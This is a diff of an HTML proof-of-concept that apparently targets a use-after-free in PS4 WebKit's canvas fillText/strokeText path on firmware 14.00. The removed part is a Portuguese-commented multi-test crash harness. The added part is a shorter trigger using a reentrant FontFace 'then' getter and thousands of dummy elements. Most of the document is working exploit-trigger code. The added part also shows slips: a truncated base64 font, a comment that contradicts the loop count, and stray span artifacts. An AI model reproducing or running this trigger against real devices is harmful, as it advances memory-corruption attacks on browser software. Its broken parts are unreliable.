@@ -1,202 +1,54 @@
 
 <!DOCTYPE html>
-<pre id="log"></pre>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>PoC - PS4 fillText FontMetrics UAF (drawTextInternal)</title>
+</head>
+<body>
+<canvas id="c" width="200" height="200" style="display:none;"></canvas>
 <script>
-// DIAGNOSTICO drawTextInternal() — PS4 FW 14.00
-//
-// Alvo: FontMetrics UAF em drawTextInternal() (fillText / strokeText)
-// Fonte: CanvasRenderingContext2D.cpp PS4 — linha 2346-2405
-//
-// Padrao vulneravel confirmado no codigo fonte:
-//   const FontMetrics& fontMetrics = font.fontMetrics(); // bind ANTES
-//   float fontWidth = font.width(...);                   // pode liberar FontCascadeFonts
-//   FloatRect textRect = FloatRect(..., fontMetrics.ascent(), ...); // UAF read
-//
-// Questoes a responder:
-//   Q1: fillText/strokeText crasham com 0 dummies?
-//       SIM → trigger diferente de measureText (mecanismo puro de FontMetrics UAF)
-//       NAO → mesmo mecanismo que B1 (dummies necessarios para getter sincrono)
-//
-//   Q2: fillText/strokeText crasham com 500 dummies?
-//       SIM → drawTextInternal() e vulneravel no PS4 (novo caminho, mesmo bug)
-//
-//   Q3: Comportamento diferente entre fillText e strokeText?
+  let face = new FontFace('TestFont', 'url("data:font/woff;base64,d09GRgABAAAA...")'); // ou fonte local se preferir
+  document.fonts.add(face);
+  face.loaded;
 
-var out = document.getElementById('log');
-var buf = '';
-function log(s) { buf += s + '\n'; out.textContent = buf; }
+  let canvas = document.getElementById('c');
+  let ctx = canvas.getContext('2d');
+  ctx.font = '10px TestFont';
 
-var uid      = 0;
-var dummyId  = 0;
-var alive    = [];
+  // Cria 500 elementos dummy para registrar FontSelectorClients e forçar o cascade
+  let dummies = [];
+  for (let i = 0; i < 3500; i++) {
+      let d = document.createElement('div');
+      d.style.font = '10px TestFont';
+      document.body.appendChild(d);
+      dummies.push(d);
+  }
 
-function addDummies(n) {
-    for (var i = 0; i < n; i++) {
-        var d = document.createElement('canvas');
-        d.width = 1; d.height = 1;
-        d.getContext('2d').font = '10px "Z' + (dummyId++) + '"';
-        alive.push(d);
-    }
-}
+  let reentered = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get() {
+          if (reentered) return undefined;
+          reentered = true;
 
-function makeCanvas(w, h) {
-    var c = document.createElement('canvas');
-    c.width = w || 200; c.height = h || 50;
-    c.style.cssText = 'position:absolute;left:-9999px';
-    document.body.appendChild(c);
-    alive.push(c);
-    return c;
-}
+          // Modifica o estado do documento / limpa o cache de fontes de forma reentrante
+          document.fonts.add(new FontFace('Trigger', 'local(Arial)'));
+          ctx.save();
+          ctx.lineWidth = 5;
+          ctx.restore();
 
-fetch('Ahem.woff')
-    .then(function(r) { return r.arrayBuffer(); })
-    .then(function(b) {
-        return new Promise(function(res, rej) {
-            var fr = new FileReader();
-            fr.onload  = function(e) { res(e.target.result); };
-            fr.onerror = rej;
-            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
-        });
-    })
-    .then(function(dataUrl) {
+          reentered = false;
+          return undefined;
+      }
+  });
 
-    var tests = [
-
-    // ------------------------------------------------------------------
-    // 1: fillText + 0 dummies
-    // Se crashar: trigger nao precisa de dummies — mecanismo diferente de B1
-    // ------------------------------------------------------------------
-    {
-        id: 1,
-        name: 'fillText  |  Times+Ahem+Cherokee  |  0 dummies',
-        info: 'crashar=trigger sem dummies; passar=precisa dummies como B1',
-        dummies: 0, fn: 'fillText'
-    },
-
-    // ------------------------------------------------------------------
-    // 2: strokeText + 0 dummies
-    // ------------------------------------------------------------------
-    {
-        id: 2,
-        name: 'strokeText  |  Times+Ahem+Cherokee  |  0 dummies',
-        info: 'mesmo que 1 mas via strokeText',
-        dummies: 0, fn: 'strokeText'
-    },
-
-    // ------------------------------------------------------------------
-    // 3: fillText + 500 dummies  [provavel crash]
-    // ------------------------------------------------------------------
-    {
-        id: 3,
-        name: 'fillText  |  Times+Ahem+Cherokee  |  500 dummies',
-        info: 'se crashar: drawTextInternal vulneravel com mesmo threshold de B1',
-        dummies: 500, fn: 'fillText'
-    },
-
-    // ------------------------------------------------------------------
-    // 4: strokeText + 500 dummies  [provavel crash]
-    // ------------------------------------------------------------------
-    {
-        id: 4,
-        name: 'strokeText  |  Times+Ahem+Cherokee  |  500 dummies',
-        info: 'strokeText tambem aciona drawTextInternal — mesmo caminho vulneravel',
-        dummies: 500, fn: 'strokeText'
-    },
-
-    // ------------------------------------------------------------------
-    // 5: fillText com texto Latin 'a' + 500 dummies
-    // Times cobre 'a' → fallback nao ativado → getter nao dispara → sem crash
-    // Controle: confirma que o caracter Cherokee e essencial para o trigger
-    // ------------------------------------------------------------------
-    {
-        id: 5,
-        name: 'fillText  |  Times+Ahem  |  texto "a" (Latin)  |  500 dummies [controle]',
-        info: 'Times cobre a — fallback nao ativado — getter nao deve disparar',
-        dummies: 500, fn: 'fillText', text: 'a'
-    },
-
-    // ------------------------------------------------------------------
-    // 6: ancora measureText + 500 dummies [crash esperado — confirmado em B1]
-    // ------------------------------------------------------------------
-    {
-        id: 6,
-        name: 'measureText  |  Times+Ahem+Cherokee  |  500 dummies [CRASH ESPERADO — ancora]',
-        info: 'Confirmado em B1. Valida que a sessao ainda funciona.',
-        dummies: 500, fn: 'measureText'
-    }
-
-    ];
-
-    var idx = 0;
-    function next() {
-        if (idx >= tests.length) {
-            log('\n=== TODOS OS TESTES CONCLUIDOS SEM CRASH ===');
-            return;
-        }
-        var t = tests[idx++];
-
-        log('--- Teste ' + t.id + ': ' + t.name);
-        log('    ' + t.info);
-
-        setTimeout(function() {
-            addDummies(t.dummies);
-            if (t.dummies > 0)
-                log('    dummies: ' + t.dummies + ' (total acumulado: ~' + dummyId + ')');
-
-            log('    [EXECUTANDO ' + t.fn + '()] <<<');
-            setTimeout(function() {
-
-                var id = uid++;
-                var face = new FontFace('FF' + id, 'url("' + dataUrl + '")');
-                document.fonts.add(face);
-                void face.loaded;
-                alive.push(face);
-
-                var ctx = makeCanvas().getContext('2d');
-                ctx.font = '10px Times, FF' + id;
-
-                var reen = false;
-                Object.defineProperty(face, 'then', {
-                    configurable: true,
-                    get: function() {
-                        if (reen) return undefined;
-                        reen = true;
-                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
-                        reen = false;
-                        return undefined;
-                    }
-                });
-
-                var charStr = t.text || '\u13A0\u13A2\u13A4';
-
-                if (t.fn === 'fillText') {
-                    // drawTextInternal(text, x, y, fill=true)
-                    // fontMetrics usada antes E depois de font.width()
-                    ctx.fillText(charStr, 10, 20);
-
-                } else if (t.fn === 'strokeText') {
-                    // drawTextInternal(text, x, y, fill=false)
-                    // mesmo caminho, condicional fill apenas muda modo de desenho
-                    ctx.lineWidth = 1;
-                    ctx.strokeText(charStr, 10, 20);
-
-                } else {
-                    // measureText — ancora
-                    ctx.measureText(charStr);
-                }
-
-                log('    PASSOU\n');
-                next();
-            }, 200);
-        }, 150);
-    }
-
-    log('=== DIAGNOSTICO drawTextInternal() — PS4 FW 14.00 ===');
-    log('Alvo: FontMetrics UAF em fillText()/strokeText()');
-    log('Foto ao ver [EXECUTANDO] antes do crash.\n');
-    next();
-
-}).catch(function(e) {
-    document.getElementById('log').textContent = 'ERRO: ' + e.message;
-});
+  // Dispara fillText que invoca drawTextInternal() no código nativo do PS4[span_2](start_span)[span_2](end_span)
+  try {
+      ctx.fillText("CrashTest", 10, 10);
+  } catch (e) {
+      console.error(e);
+  }
 </script>
+</body>
+</html>
